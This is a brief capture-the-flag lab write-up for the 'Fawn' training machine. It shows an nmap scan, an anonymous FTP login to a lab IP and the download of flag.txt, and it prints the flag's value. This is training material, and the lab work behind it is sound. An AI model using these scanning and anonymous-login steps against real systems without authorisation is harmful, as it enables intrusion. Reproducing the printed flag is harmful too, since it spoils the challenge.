# 🦌 Fawn

This was a very easy box to complete and literally took ~5mins to complete (these notes probs took more time to write than to do the machine).

## 1. Enumerate the machine by running nmap:

   ```
   sudo nmap -sC -sV -O -p- 10.129.1.14 -v
   ```
   
   This then showed that anonymous ftp was allowed and there was a file on the server:
   ![[Pasted image 20240229011847.png]]

## 2. Anonymously logging into the FTP service:

You can login to anonymously like:

```
$ ftp <target_ip>

Connected to 10.129.1.14.
220 (vsFTPd 3.0.3)
Name (10.129.1.14:root): anonymous
331 Please specify the password.
Password: anonymous
230 Login successful.
```

After logging in, a quick `ls` confirms that the `flag.txt` file is there and then we can download the file to the attacker machine using:

```
ftp> get flag.txt
```

![[Pasted image 20240229012236.png]]

The file can then be found in my home folder and the contents can be read with `cat`.

![[Pasted image 20240229012353.png]]

Contents of flag.txt: `035db21c881520061c53e0536e44f815`